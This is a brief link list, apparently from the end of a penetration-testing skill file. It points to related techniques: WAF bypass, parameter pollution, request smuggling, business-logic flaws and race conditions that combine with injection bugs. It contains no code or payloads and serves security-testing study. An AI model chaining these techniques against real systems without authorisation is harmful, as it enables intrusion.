- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — payload delivery once the filter layer is the obstacle
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) — duplicated parameters that change which value reaches the query
- [request-smuggling](../request-smuggling/SKILL.md) — routing around the WAF that blocks the injection
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) — workflows where a query-level bug becomes a financial or state-integrity finding
- [race-condition](../race-condition/SKILL.md) — TOCTOU paths that combine with an injection for durable state corruption

---
